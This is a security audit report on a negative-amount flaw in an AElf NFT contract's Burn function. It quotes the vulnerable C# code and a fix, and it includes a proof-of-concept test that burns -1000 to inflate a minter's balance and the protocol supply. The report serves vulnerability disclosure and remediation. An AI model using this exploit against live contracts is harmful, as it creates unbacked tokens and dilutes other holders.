# Audit Report

## Title
Negative Amount Bypass in NFT Burn Function Allows Arbitrary Balance Inflation

## Summary
The NFT contract's `Burn` function lacks validation for negative input amounts, allowing minters to arbitrarily inflate their NFT balances, protocol supply, and token quantities beyond the protocol's `TotalSupply` limits. When a negative amount is passed, the subtraction operation mathematically becomes addition, enabling unlimited NFT creation without minting costs.

## Finding Description

The vulnerability exists in the NFT contract's `Burn` function where it directly manipulates balances using `SafeMath.Sub()` without validating that the input amount is non-negative. [1](#0-0) 

The input amount field is defined as a signed `int64` type in the protobuf definition, allowing negative values to be passed: [2](#0-1) 

The `DoTransfer` helper function in the same contract properly validates against negative amounts with an explicit check at line 48, but the `Burn` function performs direct balance manipulation without implementing equivalent validation: [3](#0-2) 

When a negative amount is passed (e.g., `-1000`), the security check at line 91 (`State.BalanceMap[tokenHash][Context.Sender] >= input.Amount`) passes because any positive balance is greater than a negative number. Subsequently, the `SafeMath.Sub()` operation at lines 94-96 with a negative operand results in addition due to the mathematical identity: `a - (-b) = a + b`.

The `SafeMath.Sub` method for `long` values performs only overflow checking but does not validate that the second operand is non-negative: [4](#0-3) 

For comparison, the MultiToken contract's `Burn` function properly validates amounts by calling `AssertValidToken`, which internally validates that `amount > 0`: [5](#0-4) [6](#0-5) [7](#0-6) 

## Impact Explanation

**Critical Supply Invariant Violation:**

- Minters can inflate their NFT balance to arbitrary amounts (e.g., from 50 to 1,050 NFTs with a single malicious call using `-1000` as the amount)
- Protocol supply can exceed `TotalSupply` limits, breaking the fundamental NFT scarcity guarantee enforced during minting at line 405 of NFTContract_UseChain.cs: [8](#0-7) 

- Token quantity becomes inconsistent with actual minted amounts
- Enables unlimited NFT creation beyond protocol constraints without paying minting costs

**Affected Parties:**
- Existing NFT holders suffer severe dilution of their holdings
- NFT marketplace integrity is completely compromised
- Protocol economic model breaks down entirely
- Trust in the NFT platform is destroyed

This represents a complete breakdown of the token supply management system, equivalent to unlimited money printing in traditional finance.

## Likelihood Explanation

**Highly Likely to be Exploited:**

The `Burn` function is a public RPC method accessible to any caller: [9](#0-8) 

**Feasible Preconditions:**
- Attacker must be in the minter list for the target NFT protocol (validated at lines 89-93 of NFTContract_UseChain.cs)
- This is realistic as legitimate minters exist for every NFT protocol
- Minters are added through the `AddMinters` function by the protocol creator: [10](#0-9) 

**Execution Practicality:**
- Single transaction with negative amount parameter
- No complex state setup or timing requirements
- Immediate and guaranteed success if attacker has minter privileges
- Zero additional cost beyond standard transaction fees

**Economic Rationality:**
- Extremely rational for any malicious minter
- Effectively free NFT creation with zero minting cost
- Profit potential unlimited based on NFT market value
- Could be used to manipulate NFT markets or execute rug-pulls

## Recommendation

Add explicit validation in the `Burn` function to reject negative amounts, similar to the validation in `DoTransfer`:

```csharp
public override Empty Burn(BurnInput input)
{
    // Add validation for negative amounts
    Assert(input.Amount > 0, "Invalid burn amount.");
    
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    var nftInfo = GetNFTInfoByTokenHash(tokenHash);
    var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
    Assert(nftProtocolInfo.IsBurnable,
        $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
    var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
    Assert(
        State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
        minterList.Value.Contains(Context.Sender),
        "No permission.");
    State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
    nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
    nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

    State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
    if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

    State.NftInfoMap[tokenHash] = nftInfo;

    Context.Fire(new Burned
    {
        Burner = Context.Sender,
        Symbol = input.Symbol,
        Amount = input.Amount,
        TokenId = input.TokenId
    });
    return new Empty();
}
```

## Proof of Concept

```csharp
[Fact]
public async Task NegativeAmountBurnInflatesBalance()
{
    // Create NFT protocol
    var symbol = await CreateTest();
    await AddMinterAsync(symbol);

    // Mint initial NFT to minter
    var tokenHash = (await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Alias = "test",
        Metadata = new Metadata(),
        Owner = MinterAddress,
        Uri = "ipfs://test"
    })).Output;

    // Get initial balance (should be 1)
    var initialBalance = await NFTContractStub.GetBalanceByTokenHash.CallAsync(
        new GetBalanceByTokenHashInput
        {
            Owner = MinterAddress,
            TokenHash = tokenHash
        });
    initialBalance.Balance.ShouldBe(1);

    // Get initial protocol info
    var initialProtocol = await NFTContractStub.GetNFTProtocolInfo.CallAsync(
        new StringValue { Value = symbol });
    var initialSupply = initialProtocol.Supply;

    // Exploit: Burn with negative amount to inflate balance
    await MinterNFTContractStub.Burn.SendAsync(new BurnInput
    {
        Symbol = symbol,
        TokenId = 1,
        Amount = -1000  // Negative amount!
    });

    // Verify balance inflated instead of decreased
    var finalBalance = await NFTContractStub.GetBalanceByTokenHash.CallAsync(
        new GetBalanceByTokenHashInput
        {
            Owner = MinterAddress,
            TokenHash = tokenHash
        });
    finalBalance.Balance.ShouldBe(1001);  // 1 - (-1000) = 1001

    // Verify supply also inflated
    var finalProtocol = await NFTContractStub.GetNFTProtocolInfo.CallAsync(
        new StringValue { Value = symbol });
    finalProtocol.Supply.ShouldBe(initialSupply + 1000);
    
    // Supply now exceeds original constraints
}
```

## Notes

This vulnerability demonstrates a critical input validation failure where the NFT contract trusts signed integer inputs without proper bounds checking. The issue is particularly severe because:

1. It bypasses the `TotalSupply` constraint that is enforced during legitimate minting operations
2. The attacker only needs to be a legitimate minter (not a privileged system role)
3. The exploit is deterministic and requires no special timing or complex state manipulation
4. Unlike the MultiToken contract which has proper validation, the NFT contract lacks this critical check

The fix is straightforward and should be applied immediately to prevent supply inflation attacks.

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L82-111)
```csharp
    public override Empty Burn(BurnInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var nftInfo = GetNFTInfoByTokenHash(tokenHash);
        var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
        if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

        State.NftInfoMap[tokenHash] = nftInfo;

        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L335-353)
```csharp
    public override Empty AddMinters(AddMintersInput input)
    {
        var protocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(Context.Sender == protocolInfo.Creator, "No permission.");
        var minterList = State.MinterListMap[protocolInfo.Symbol] ?? new MinterList();

        foreach (var minter in input.MinterList.Value)
            if (!minterList.Value.Contains(minter))
                minterList.Value.Add(minter);

        State.MinterListMap[input.Symbol] = minterList;

        Context.Fire(new MinterListAdded
        {
            Symbol = input.Symbol,
            MinterList = input.MinterList
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L402-406)
```csharp
        var quantity = input.Quantity > 0 ? input.Quantity : 1;
        protocolInfo.Supply = protocolInfo.Supply.Add(quantity);
        protocolInfo.Issued = protocolInfo.Issued.Add(quantity);
        Assert(protocolInfo.Issued <= protocolInfo.TotalSupply, "Total supply exceeded.");
        State.NftProtocolMap[input.Symbol] = protocolInfo;
```

**File:** protobuf/nft_contract.proto (L45-47)
```text
    // Destroy nfts.
    rpc Burn (BurnInput) returns (google.protobuf.Empty) {
    }
```

**File:** protobuf/nft_contract.proto (L182-186)
```text
message BurnInput {
    string symbol = 1;
    int64 token_id = 2;
    int64 amount = 3;
}
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L323-337)
```csharp
    private Empty Burn(Address address, string symbol, long amount)
    {
        var tokenInfo = AssertValidToken(symbol, amount);
        Assert(tokenInfo.IsBurnable, "The token is not burnable.");
        ModifyBalance(address, symbol, -amount);
        tokenInfo.Supply = tokenInfo.Supply.Sub(amount);

        Context.Fire(new Burned
        {
            Burner = address,
            Symbol = symbol,
            Amount = amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L33-39)
```csharp
    private TokenInfo AssertValidToken(string symbol, long amount)
    {
        AssertValidSymbolAndAmount(symbol, amount);
        var tokenInfo = GetTokenInfo(symbol);
        Assert(tokenInfo != null && !string.IsNullOrEmpty(tokenInfo.Symbol), $"Token is not found. {symbol}");
        return tokenInfo;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L81-86)
```csharp
    private void AssertValidSymbolAndAmount(string symbol, long amount)
    {
        Assert(!string.IsNullOrEmpty(symbol) && IsValidSymbol(symbol),
            "Invalid symbol.");
        Assert(amount > 0, "Invalid amount.");
    }
```
